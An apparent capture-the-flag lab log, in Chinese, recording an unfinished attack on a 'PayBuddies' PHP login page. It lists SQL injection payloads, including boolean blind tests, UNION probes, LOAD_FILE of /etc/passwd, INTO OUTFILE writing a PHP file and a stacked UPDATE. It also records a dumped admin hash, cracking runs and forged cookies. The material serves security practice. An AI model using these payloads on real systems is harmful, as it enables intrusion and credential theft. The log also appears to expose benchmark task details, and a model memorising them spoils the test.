# xben-029-24 · 探索记录（进行中，未解出）

对应题解：待补充。

> 本文记录截至目前尝试。**flag 尚未取得。**

## 目标与起点

容器 `10.0.173.136:80`，`Apache/2.4.41 (Ubuntu)`，`Set-Cookie: PHPSESSID=…`（PHP）。
页面标题 `PayBuddies Portal | Login`。

登录是 AJAX：

```javascript
$.ajax({ type:'post', url:'index.php',
         data:{ username, password, submit:'submit' }, dataType:'json' });
// 响应三种：{"response":"Success"} / "password" / "username"
```

前端限制：用户名 ≥5 字符、密码 ≥8 字符（仅客户端校验，服务端不校验）。

## 第一阶段：用户枚举 + 注入点确认

| username | 响应 |
| --- | --- |
| `admin` | `{"response":"password"}`（用户存在，口令错） |
| `test` | `{"response":"username"}`（用户不存在） |
| `admin'` | `username`（SQL 里引号破坏了，说明**未转义**） |
| `admin'-- -` | `password`（注释生效 → 注入确认） |
| `admin' AND 1=1-- -` | `password` |
| `admin' AND 1=2-- -` | `username` |
| `admin' AND 'a'='a'-- -` | `password` |

**结论**：`username` 存在布尔盲注 oracle（`password` = 真 / `username` = 假）。

## 第二阶段：确认后端与结构

| 探测 | 结果 | 结论 |
| --- | --- | --- |
| `@@version LIKE '8%'` | 真 | MySQL 8.x |
| `sqlite_version()` | 报错 | 不是 SQLite |
| `ORDER BY 1` | 真 | 结果集 1 列 |
| `ORDER BY 2` | 假（报错） | 确认只有 1 列 |

盲注提取（`blind29.py`，二分长度 + 逐字符）：

| 查询 | 结果 |
| --- | --- |
| `information_schema.schemata` | `information_schema,performance_schema,payroll_db` |
| `payroll_db` 的表 | `users` |
| `users` 的列 | `user_id,username,password` |
| `users` 的行 | `1:admin:7d39307ae824e70052c0aa16816a9b16` |

即：全库只有一个用户 `admin`，口令是 32 位 hex（MD5 形态）。

## 第三阶段：口令破解（失败）

| 尝试 | 规模 | 结果 |
| --- | --- | --- |
| ignis 1M 字典 | 1 000 000 | 未命中 |
| 之前的 100k / top 12k | 100 000+12 645 | 未命中 |
| 站点相关词表（paybuddies/admins/… × 后缀 × 分隔符 × leet） | 3 295 | 未命中 |
| 纯数字/小写字母 1–4 位 | 1.7M | 未命中 |
| 小写字母+数字 5 位 | 60 466 176 | 未命中 |
| 加盐方案（md5(admin+p)、md5(p+admin)、md5(md5(p))、sha1/sha256 前 32 位、大写） | 1.1M × 12 种 | 未命中 |

## 第四阶段：绕过登录的尝试（全部失败）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `' UNION SELECT 1-- -` | `password` | UNION 生效（行存在） |
| `' UNION SELECT 0x<md5('pwned123')>-- -` + `password=pwned123` | `password` | 拿不到 Success |
| `admin' UNION SELECT 0x<md5>-- -` | `password` | 第一行仍是 admin 的真实 hash |
| `admin' UNION SELECT 0x<md5> ORDER BY 1 DESC-- -` | `username` | 语法/包装导致报错 |
| `admin' OR '1'='1`、`admin' OR 1=1-- `、`admin'||'1'='1` | 全 `password` | 口令比较在 SQL 之外（两段式逻辑） |
| 密码字段注入（`' OR '1'='1` 等） | 全 `password` | 密码先被 hash/前置处理 |
| `submit` 参数注入 | 无变化 | 未参与查询 |
| `LOAD_FILE('/FLAG.txt')`、`/etc/passwd` | 假 | 无 FILE 权限或受限 |
| `SELECT ... INTO OUTFILE '/var/www/html/x29.php'` | 后续 GET 404 | 写不进去 |
| `/upload.php`、`/dashboard.php` | 302 → `index.php?error=failed_login` | 都需要会话 |
| 伪造 cookie（`user=admin`/`admin=1`/`role=admin`/`PHPSESSID=1`） | 302 | 会话在服务端 |
| 路径枚举（`/register.php`、`/admin.php`、`/flag.php`、`/.git/config` 等） | 全 404 | 只有 `index.php`、`dashboard.php`、`upload.php` |

## 第五阶段：SQL 侧的进一步确认

```sql
SELECT CONCAT(@@secure_file_priv, 0x7c, CURRENT_USER(), 0x7c, @@datadir)
→ '/var/lib/mysql-files/|web_db_user@localhost|/var/lib/mysql/'
```

`secure_file_priv` 被限制在 `/var/lib/mysql-files/`，所以 `LOAD_FILE` 与
`INTO OUTFILE` 都只能操作那个目录——既读不到 `/FLAG.txt`，也写不进 docroot。

## 当前判断

- 盲注是真实且完整的（任意表达式都能逐字符取出），但库里**只有** `users` 一行，
  没有 flag 表。
- flag 只能通过 `dashboard.php` / `upload.php`（都需要登录）获得，
  因此瓶颈是 `admin` 的口令。
- 口令 hash 不在 210 万条常见口令 + 62M 位掩码里，说明它不是普通弱口令。

## 下一步想法

1. 继续更大规模的掩码破解（6 位小写字母约 3.1 亿，用 C 多线程可行）。
2. 复检登录逻辑：`ORDER BY 2` 报错说明只有 1 列，可能是 `SELECT user_id ...`；
   若第二段查询用 `user_id` 拼接，可以试把 `user_id` 换成嵌套 UNION（已试过两种写法，
   均返回 `password`，需要更精确地推断第二段 SQL）。
3. 检查是否存在 `dashboard.php` 的「登录后才有」的隐藏参数（例如 `?user_id=`），
   先想办法拿到任意会话（例如通过 upload 的未授权分支）。

## 补充：2026-10-28（新 token 场次）——布尔盲注可用

这次实例的登录接口是 `POST /index.php`，返回 JSON：`{"response":"Success"|"password"|"username"}`。

| username | password | response |
| --- | --- | --- |
| `admin` | 任意 | `password`（用户存在） |
| `admin' AND 1=1 -- -` | `xxxxxxxx` | `password` |
| `admin' AND 1=2 -- -` | `xxxxxxxx` | `username` |
| `' UNION SELECT 1 -- -` | | `password`（1 列） |
| `' UNION SELECT 1,2 -- -` | | `username`（列数不符） |

判据：`AND 1=1 / 1=2` 的响应不同 → `username` 参数是 **布尔盲注**（MySQL，`-- -` 注释有效），
且 `SELECT` 只取 1 列（`users` 表）。

用 ASCII/SUBSTR 二分可完整拖库（脚本见探索记录逻辑）：

```text
DATABASE()  -> payroll_db
tables      -> users
columns     -> user_id,username,password
rows        -> 1 条：admin
password    -> 7d39307ae824e70052c0aa16816a9b16   (32 hex)
```

`LOAD_FILE()` 不可用（`user_privileges` 为空），所以读不了 `dashboard.php`。

## 卡点

- `password` 列是 32 位 hex，疑似 md5；用 100 万常用口令、`md5(md5(x))`、
  `md5(sha1(x))`、大写变体都未命中。
- 尝试在 `username` 里 `UNION SELECT 0x<md5>`（想控制密码比对结果）无效，
  说明「校验用户名」和「校验密码」是两条不同的查询，密码那条没有拼接用户输入。
- 堆叠 `; UPDATE users SET password=...` 不生效（多语句被禁）。
- 结论：本题只差「admin 明文口令」这一步；盲注与哈希提取已验证，爆破未成功。
